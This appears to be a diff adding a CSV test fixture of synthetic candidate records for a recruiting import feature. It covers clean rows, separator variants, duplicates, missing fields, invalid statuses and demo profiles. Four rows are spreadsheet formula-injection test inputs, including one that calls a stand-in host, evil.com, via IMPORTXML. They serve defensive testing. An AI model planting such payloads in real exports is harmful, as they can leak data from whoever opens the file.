@@ -1,0 +1,76 @@
+name,email,phone,skills,experience,status,source,location,type,notes
+Aarav Shah,aarav.shah.l1.0@test.com,9876540000,"Python,Machine Learning,AI",1,New,LinkedIn,Chennai,Trainer,L1 clean record 0
+Priya Sharma,priya.sharma.l1.1@test.com,9876540001,"React,TypeScript,Node.js",2,Under Review,Referral,Bangalore,Consultant,L1 clean record 1
+Rahul Kumar,rahul.kumar.l1.2@test.com,9876540002,"AWS,Kubernetes,Docker",3,Shortlisted,WhatsApp,Mumbai,Employee,L1 clean record 2
+Meera Pillai,meera.pillai.l1.3@test.com,9876540003,NLP;BERT;LLMs,4,Approved,Job Portal,Delhi,Speaker,L1 clean record 3
+Arjun Singh,arjun.singh.l1.4@test.com,9876540004,Java/Spring Boot/SQL,5,Engaged,Email,Hyderabad,Freelancer,L1 clean record 4
+Divya Nair,divya.nair.l1.5@test.com,9876540005,"Figma,UI/UX,Design Systems",6,Rejected,Manual,Pune,Contractor,L1 clean record 5
+Karthik Rajan,karthik.rajan.l1.6@test.com,9876540006,"Data Science,Tableau,Power BI",7,New,LinkedIn,Kolkata,Mentor,L1 clean record 6
+Sneha Patel,sneha.patel.l1.7@test.com,9876540007,Flutter/Dart/Firebase,8,Under Review,Referral,Jaipur,Other,L1 clean record 7
+Vikram Rao,vikram.rao.l1.8@test.com,9876540008,"Leadership,Coaching,Agile",9,Shortlisted,WhatsApp,Chennai,Trainer,L1 clean record 8
+Ananya Gupta,ananya.gupta.l1.9@test.com,9876540009,"DevOps,Terraform,Ansible",10,Approved,Job Portal,Bangalore,Consultant,L1 clean record 9
+Comma Sep,comma.sep@test.com,9000000001,"Python,AI,Cloud",3,New,Manual,Chennai,Trainer,L2 comma separator
+Slash Sep,slash.sep@test.com,9000000002,Python/AI/Cloud,3,New,Manual,Mumbai,Trainer,L2 slash separator
+Semi Sep,semi.sep@test.com,9000000003,Python;AI;Cloud,3,New,Manual,Delhi,Trainer,L2 semicolon separator
+Pipe Sep,pipe.sep@test.com,9000000004,Python|AI|Cloud,3,New,Manual,Pune,Trainer,L2 pipe separator
+Mixed Sep,mixed.sep@test.com,9000000005,"Python, AI/ML;Cloud|DevOps",3,New,Manual,Bangalore,Trainer,L5 mixed separators
+Ampersand Sep,amp.sep@test.com,9000000006,NLP & LLM,4,New,Manual,Chennai,Consultant,L5 ampersand
+Duplicate Person,aarav.shah.l1.0@test.com,9000000007,Python,5,New,LinkedIn,Mumbai,Consultant,L3 DUPLICATE EMAIL
+,missingnameonly@test.com,9000000008,Python,2,New,Manual,Delhi,Trainer,L4 MISSING NAME - should skip
+Has Name Only,,,React,3,New,LinkedIn,Pune,Employee,L4 missing email and phone - valid row
+Bad Status,badstatus@test.com,9000000009,Python,4,Super Approved,Manual,Chennai,Trainer,L7 invalid status - should map to New
+Empty Status,emptystatus@test.com,9000000010,React,3,,LinkedIn,Bangalore,Employee,L7 empty status - should default to New
+"=IMPORTXML(""evil.com"",""//secret"")",injection1@test.com,9000000011,Python,3,New,Manual,Chennai,Trainer,L8 formula injection 1
+"+SUM(A1:B1) attack",injection2@test.com,9000000012,React,3,New,Manual,Mumbai,Employee,L8 formula injection 2
+"-SUM() formula",injection3@test.com,9000000013,Java,3,New,Manual,Delhi,Consultant,L8 formula injection 3
+"@malicious formula",injection4@test.com,9000000014,Go,3,New,Manual,Hyderabad,Trainer,L8 at sign injection
+Aarav Shah Demo1,aarav.shah.demo1.0@showcase.com,8765430000,"Python,Machine Learning,Deep Learning",1,New,LinkedIn,Chennai,Trainer,Showcase profile 1
+Priya Sharma Demo2,priya.sharma.demo2.1@showcase.com,8765430001,"React,Node.js,TypeScript",1,New,Referral,Bangalore,Trainer,Showcase profile 2
+Rahul Kumar Demo3,rahul.kumar.demo3.2@showcase.com,8765430002,"AWS,Azure,Kubernetes",1,Under Review,WhatsApp,Mumbai,Trainer,Showcase profile 3
+Meera Pillai Demo4,meera.pillai.demo4.3@showcase.com,8765430003,"NLP,BERT,LLMs,PyTorch",1,Under Review,Job Portal,Delhi,Trainer,Showcase profile 4
+Arjun Singh Demo5,arjun.singh.demo5.4@showcase.com,8765430004,"Public Speaking,Innovation,Digital Transformation",1,Shortlisted,Email,Hyderabad,Trainer,Showcase profile 5
+Divya Nair Demo6,divya.nair.demo6.5@showcase.com,8765430005,"Figma,UI/UX Design,Design Systems",2,Shortlisted,Manual,Chennai,Trainer,Showcase profile 6
+Karthik Rajan Demo7,karthik.rajan.demo7.6@showcase.com,8765430006,"Java,Spring Boot,Microservices",2,Approved,LinkedIn,Bangalore,Trainer,Showcase profile 7
+Sneha Patel Demo8,sneha.patel.demo8.7@showcase.com,8765430007,"Data Science,Python,Tableau",2,Approved,Referral,Mumbai,Trainer,Showcase profile 8
+Vikram Rao Demo9,vikram.rao.demo9.8@showcase.com,8765430008,"DevOps,CI/CD,Docker,Terraform",2,Engaged,WhatsApp,Delhi,Trainer,Showcase profile 9
+Ananya Gupta Demo10,ananya.gupta.demo10.9@showcase.com,8765430009,"Leadership,Coaching,Strategy",2,Rejected,Job Portal,Hyderabad,Trainer,Showcase profile 10
+Rohan Mehta Demo11,rohan.mehta.demo11.10@showcase.com,8765430010,"Python,Machine Learning,Deep Learning",3,New,Email,Chennai,Consultant,Showcase profile 11
+Aisha Nambiar Demo12,aisha.nambiar.demo12.11@showcase.com,8765430011,"React,Node.js,TypeScript",3,New,Manual,Bangalore,Consultant,Showcase profile 12
+Suresh Babu Demo13,suresh.babu.demo13.12@showcase.com,8765430012,"AWS,Azure,Kubernetes",3,Under Review,LinkedIn,Mumbai,Consultant,Showcase profile 13
+Kavya Reddy Demo14,kavya.reddy.demo14.13@showcase.com,8765430013,"NLP,BERT,LLMs,PyTorch",3,Under Review,Referral,Delhi,Consultant,Showcase profile 14
+Deepak Verma Demo15,deepak.verma.demo15.14@showcase.com,8765430014,"Public Speaking,Innovation,Digital Transformation",3,Shortlisted,WhatsApp,Hyderabad,Consultant,Showcase profile 15
+Pooja Mishra Demo16,pooja.mishra.demo16.15@showcase.com,8765430015,"Figma,UI/UX Design,Design Systems",4,Shortlisted,Job Portal,Chennai,Consultant,Showcase profile 16
+Sanjay Agarwal Demo17,sanjay.agarwal.demo17.16@showcase.com,8765430016,"Java,Spring Boot,Microservices",4,Approved,Email,Bangalore,Consultant,Showcase profile 17
+Nisha Jain Demo18,nisha.jain.demo18.17@showcase.com,8765430017,"Data Science,Python,Tableau",4,Approved,Manual,Mumbai,Consultant,Showcase profile 18
+Rajesh Iyer Demo19,rajesh.iyer.demo19.18@showcase.com,8765430018,"DevOps,CI/CD,Docker,Terraform",4,Engaged,LinkedIn,Delhi,Consultant,Showcase profile 19
+Lakshmi Devi Demo20,lakshmi.devi.demo20.19@showcase.com,8765430019,"Leadership,Coaching,Strategy",4,Rejected,Referral,Hyderabad,Consultant,Showcase profile 20
+Aarav Shah Demo21,aarav.shah.demo21.20@showcase.com,8765430020,"Python,Machine Learning,Deep Learning",5,New,WhatsApp,Chennai,Employee,Showcase profile 21
+Priya Sharma Demo22,priya.sharma.demo22.21@showcase.com,8765430021,"React,Node.js,TypeScript",5,New,Job Portal,Bangalore,Employee,Showcase profile 22
+Rahul Kumar Demo23,rahul.kumar.demo23.22@showcase.com,8765430022,"AWS,Azure,Kubernetes",5,Under Review,Email,Mumbai,Employee,Showcase profile 23
+Meera Pillai Demo24,meera.pillai.demo24.23@showcase.com,8765430023,"NLP,BERT,LLMs,PyTorch",5,Under Review,Manual,Delhi,Employee,Showcase profile 24
+Arjun Singh Demo25,arjun.singh.demo25.24@showcase.com,8765430024,"Public Speaking,Innovation,Digital Transformation",5,Shortlisted,LinkedIn,Hyderabad,Employee,Showcase profile 25
+Divya Nair Demo26,divya.nair.demo26.25@showcase.com,8765430025,"Figma,UI/UX Design,Design Systems",6,Shortlisted,Referral,Chennai,Employee,Showcase profile 26
+Karthik Rajan Demo27,karthik.rajan.demo27.26@showcase.com,8765430026,"Java,Spring Boot,Microservices",6,Approved,WhatsApp,Bangalore,Employee,Showcase profile 27
+Sneha Patel Demo28,sneha.patel.demo28.27@showcase.com,8765430027,"Data Science,Python,Tableau",6,Approved,Job Portal,Mumbai,Employee,Showcase profile 28
+Vikram Rao Demo29,vikram.rao.demo29.28@showcase.com,8765430028,"DevOps,CI/CD,Docker,Terraform",6,Engaged,Email,Delhi,Employee,Showcase profile 29
+Ananya Gupta Demo30,ananya.gupta.demo30.29@showcase.com,8765430029,"Leadership,Coaching,Strategy",6,Rejected,Manual,Hyderabad,Employee,Showcase profile 30
+Rohan Mehta Demo31,rohan.mehta.demo31.30@showcase.com,8765430030,"Python,Machine Learning,Deep Learning",7,New,LinkedIn,Chennai,Speaker,Showcase profile 31
+Aisha Nambiar Demo32,aisha.nambiar.demo32.31@showcase.com,8765430031,"React,Node.js,TypeScript",7,New,Referral,Bangalore,Speaker,Showcase profile 32
+Suresh Babu Demo33,suresh.babu.demo33.32@showcase.com,8765430032,"AWS,Azure,Kubernetes",7,Under Review,WhatsApp,Mumbai,Speaker,Showcase profile 33
+Kavya Reddy Demo34,kavya.reddy.demo34.33@showcase.com,8765430033,"NLP,BERT,LLMs,PyTorch",7,Under Review,Job Portal,Delhi,Speaker,Showcase profile 34
+Deepak Verma Demo35,deepak.verma.demo35.34@showcase.com,8765430034,"Public Speaking,Innovation,Digital Transformation",7,Shortlisted,Email,Hyderabad,Speaker,Showcase profile 35
+Pooja Mishra Demo36,pooja.mishra.demo36.35@showcase.com,8765430035,"Figma,UI/UX Design,Design Systems",8,Shortlisted,Manual,Chennai,Speaker,Showcase profile 36
+Sanjay Agarwal Demo37,sanjay.agarwal.demo37.36@showcase.com,8765430036,"Java,Spring Boot,Microservices",8,Approved,LinkedIn,Bangalore,Speaker,Showcase profile 37
+Nisha Jain Demo38,nisha.jain.demo38.37@showcase.com,8765430037,"Data Science,Python,Tableau",8,Approved,Referral,Mumbai,Speaker,Showcase profile 38
+Rajesh Iyer Demo39,rajesh.iyer.demo39.38@showcase.com,8765430038,"DevOps,CI/CD,Docker,Terraform",8,Engaged,WhatsApp,Delhi,Speaker,Showcase profile 39
+Lakshmi Devi Demo40,lakshmi.devi.demo40.39@showcase.com,8765430039,"Leadership,Coaching,Strategy",8,Rejected,Job Portal,Hyderabad,Speaker,Showcase profile 40
+Aarav Shah Demo41,aarav.shah.demo41.40@showcase.com,8765430040,"Python,Machine Learning,Deep Learning",9,New,Email,Chennai,Freelancer,Showcase profile 41
+Priya Sharma Demo42,priya.sharma.demo42.41@showcase.com,8765430041,"React,Node.js,TypeScript",9,New,Manual,Bangalore,Freelancer,Showcase profile 42
+Rahul Kumar Demo43,rahul.kumar.demo43.42@showcase.com,8765430042,"AWS,Azure,Kubernetes",9,Under Review,LinkedIn,Mumbai,Freelancer,Showcase profile 43
+Meera Pillai Demo44,meera.pillai.demo44.43@showcase.com,8765430043,"NLP,BERT,LLMs,PyTorch",9,Under Review,Referral,Delhi,Freelancer,Showcase profile 44
+Arjun Singh Demo45,arjun.singh.demo45.44@showcase.com,8765430044,"Public Speaking,Innovation,Digital Transformation",9,Shortlisted,WhatsApp,Hyderabad,Freelancer,Showcase profile 45
+Divya Nair Demo46,divya.nair.demo46.45@showcase.com,8765430045,"Figma,UI/UX Design,Design Systems",10,Shortlisted,Job Portal,Chennai,Freelancer,Showcase profile 46
+Karthik Rajan Demo47,karthik.rajan.demo47.46@showcase.com,8765430046,"Java,Spring Boot,Microservices",10,Approved,Email,Bangalore,Freelancer,Showcase profile 47
+Sneha Patel Demo48,sneha.patel.demo48.47@showcase.com,8765430047,"Data Science,Python,Tableau",10,Approved,Manual,Mumbai,Freelancer,Showcase profile 48
+Vikram Rao Demo49,vikram.rao.demo49.48@showcase.com,8765430048,"DevOps,CI/CD,Docker,Terraform",10,Engaged,LinkedIn,Delhi,Freelancer,Showcase profile 49
+Ananya Gupta Demo50,ananya.gupta.demo50.49@showcase.com,8765430049,"Leadership,Coaching,Strategy",10,Rejected,Referral,Hyderabad,Freelancer,Showcase profile 50
